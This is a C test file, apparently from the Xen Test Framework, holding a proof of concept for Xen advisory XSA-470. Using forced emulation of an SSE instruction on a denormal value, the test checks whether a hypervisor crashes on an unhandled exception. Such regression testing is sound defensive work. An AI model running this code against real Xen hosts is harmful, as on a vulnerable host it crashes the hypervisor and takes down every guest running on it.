/**
 * @file tests/xsa-470/main.c
 * @ref test-xsa-470
 *
 * @page test-xsa-470 XSA-470
 *
 * Advisory: [XSA-470](https://xenbits.xen.org/xsa/advisory-470.html)
 *
 * When stub exception recovery support was added to Xen, the source address
 * in EXTABLE was incorrect for instructions which need to recover eflags.
 *
 * For such an instruction which takes an exception, Xen will not find fixup
 * logic, and will crash with an unhandled exception.
 *
 * @see tests/xsa-470/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-470 PoC";
bool test_needs_fep = true;

void test_main(void)
{
    unsigned int status, denorm = 0x1;
    exinfo_t fault = 0;

    /* Enable SSE, clear and unmask all exceptions. */
    write_cr4(read_cr4() | X86_CR4_OSFXSR | X86_CR4_OSXMMEXCPT);
    write_mxcsr(0);

    /*
     * As we're compiled with -mno-sse, SSE register constraints aren't
     * tolerated.  Just use %xmm0 behind the back of the compiler; it's not
     * going to interfere with anything.
     */
    asm volatile ("movd %[denorm], %%xmm0\n\t"
                  _ASM_XEN_FEP "1: ucomiss %%xmm0, %%xmm0\n\t"
                  "2: "
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+a" (fault)
                  : [rec] "p" (ex_record_fault_eax),
                    [denorm] "rm" (denorm));

    /*
     * If we're still alive here, Xen didn't crash.  Cross-check that the
     * emulator did hand us back the right exception.
     */
    if ( fault != EXINFO_SYM(XM, 0) )
        return xtf_error("Error: expecting #XM, got %pe\n", _p(fault));

    status = read_mxcsr() & X86_MXCSR_STATUS_MASK;
    if ( status != X86_MXCSR_DE )
        return xtf_error("Error: expecting #D, got %#x\n", status);

    xtf_success("Success: Not vulnerable to XSA-470\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
